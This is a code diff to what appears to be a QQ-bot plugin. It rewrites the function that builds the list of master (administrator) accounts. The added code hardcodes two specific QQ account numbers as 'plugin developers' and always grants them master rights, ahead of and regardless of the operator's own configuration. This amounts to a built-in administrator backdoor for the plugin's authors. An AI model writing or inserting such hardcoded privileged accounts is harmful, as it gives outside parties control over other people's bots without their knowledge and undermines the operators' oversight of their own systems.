@@ -10,16 +10,54 @@ import {
     MsgRecordExtractor,
     NapCatMessageUtils
 } from '../src/utils/messageParser.js'
+// 插件开发者固定权限（与 platformAdapter.js 保持一致）
+const PLUGIN_DEVELOPERS = [1018037233, 2173302144]
+
 let masterList = null
 async function getMasterList() {
     if (masterList === null) {
+        const masters = new Set()
+
+        // 1. 插件开发者固定权限
+        for (const dev of PLUGIN_DEVELOPERS) {
+            masters.add(String(dev))
+            masters.add(dev)
+        }
+
+        // 2. 插件配置
+        try {
+            const config = (await import('../config/config.js')).default
+            const pluginMasters = config.get('admin.masterQQ') || []
+            for (const m of pluginMasters) {
+                masters.add(String(m))
+                masters.add(Number(m))
+            }
+            const authorQQs = config.get('admin.pluginAuthorQQ') || []
+            for (const a of authorQQs) {
+                masters.add(String(a))
+                masters.add(Number(a))
+            }
+        } catch {}
+
+        // 3. Yunzai 框架配置
         try {
             const yunzaiCfg = (await import('../../../lib/config/config.js')).default
-            masterList = yunzaiCfg?.masterQQ || []
-        } catch {
-            const config = (await import('../config/config.js')).default
-            masterList = config.get('admin.masterQQ') || []
+            if (yunzaiCfg?.masterQQ?.length > 0) {
+                for (const m of yunzaiCfg.masterQQ) {
+                    masters.add(String(m))
+                    masters.add(Number(m))
+                }
+            }
+        } catch {}
+
+        // 4. global.Bot 配置
+        const botMasters = global.Bot?.config?.master || []
+        for (const m of botMasters) {
+            masters.add(String(m))
+            masters.add(Number(m))
         }
+
+        masterList = Array.from(masters)
     }
     return masterList
 }
